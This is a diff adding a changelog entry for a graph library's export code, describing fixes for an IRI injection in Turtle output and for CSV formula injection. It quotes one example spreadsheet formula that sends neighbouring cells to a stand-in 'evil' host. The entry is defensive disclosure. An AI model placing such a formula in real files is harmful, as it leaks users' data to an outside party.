@@ -1,6 +1,24 @@
 # Changelog
 
-## 1.0.0 (continued): 2026-08-14 (parse boundary, adopter docs, planning tree)
+## 1.0.0 (continued): 2026-08-14 (parse boundary, export encoding, adopter docs, planning tree)
+
+- **`@g3t/core`: both export sinks encode for their consumer, not just
+  for their format.** `exportSubgraphTurtle` escaped every term through
+  `iriSafe` or `turtleLiteral` except one: `provenance_iri` was
+  stringified straight into `<...>`. That property arrives from adapter
+  responses and imported documents, so a value that closes the bracket
+  and opens its own subject wrote attacker-chosen triples into the .ttl
+  an analyst loads into a triplestore, forging lineage in the file whose
+  docstring exists to preserve it. Characters Turtle forbids in an
+  IRIREF are now percent-escaped, and a value with no scheme is dropped
+  with an in-band comment rather than emitted as a relative IRI that
+  resolves against the base into a real subject. `exportSubgraphCsv`
+  quoted for the delimiter but passed a leading `=`, `+`, `-`, `@`, tab
+  or CR through to the spreadsheet this module names as its consumer,
+  where `=HYPERLINK("https://evil/"&A2,"x")` exfiltrates neighbouring
+  cells on click. Those cells now get the standard leading apostrophe.
+  Plain numbers are exempt, so a negative measurement stays arithmetic;
+  `-1+1` is not a number and is guarded.
 
 - **`@g3t/core`: `parseGraphDocument` now checks element shape, not
   just the document envelope.** It declared a
